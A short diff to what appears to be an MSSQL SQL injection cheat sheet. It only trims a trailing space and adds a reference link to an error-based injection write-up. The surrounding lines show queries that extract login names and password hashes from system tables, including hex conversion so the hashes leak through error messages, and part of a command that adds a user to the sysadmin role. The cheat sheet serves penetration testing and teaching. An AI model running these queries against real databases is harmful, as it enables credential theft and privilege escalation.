@@ -37,7 +37,7 @@ SELECT name, password FROM master..sysxlogins
 SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)
 
 MSSQL 2005
-SELECT name, password_hash FROM master.sys.sql_logins 
+SELECT name, password_hash FROM master.sys.sql_logins
 SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
 
@@ -78,3 +78,4 @@ EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
 ## Thanks to
  * [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
  * [Sqlinjectionwiki - MSSQL](http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/)
+ * [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
